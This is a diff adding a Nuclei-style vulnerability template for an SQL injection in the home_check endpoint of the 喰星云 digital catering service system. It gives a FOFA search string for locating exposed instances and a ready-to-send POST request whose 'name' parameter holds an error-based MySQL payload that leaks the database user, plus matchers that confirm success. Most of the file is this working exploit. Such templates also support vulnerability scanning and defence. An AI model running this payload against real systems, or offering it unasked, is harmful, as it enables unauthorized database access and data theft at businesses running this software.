@@ -1,0 +1,32 @@
+id: chuixingyun-catering-home_check-sqli
+
+info:
+  name: "喰星云数字化餐饮服务系统 home_check 接口 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    |- fofa: body="tmp_md5_pwd"
+      reference: 
+      CVE: 
+      技术细节描述：目标系统在处理home_check接口参数时未正确过滤特殊字符，攻击者可通过构造恶意输入实现SQL语法注入，进而可能获取数据库敏感信息或执行未授权操作。
+  tags: 喰星云数字化餐饮服务系统
+
+http:
+- raw:
+  - |
+    POST /chainsales/mobile/home/check HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Content-Type: application/x-www-form-urlencoded
+
+    name=%' AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1=1,user()))),0x7e),8475) AND '1%'='1&pwd=123
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'GTID'
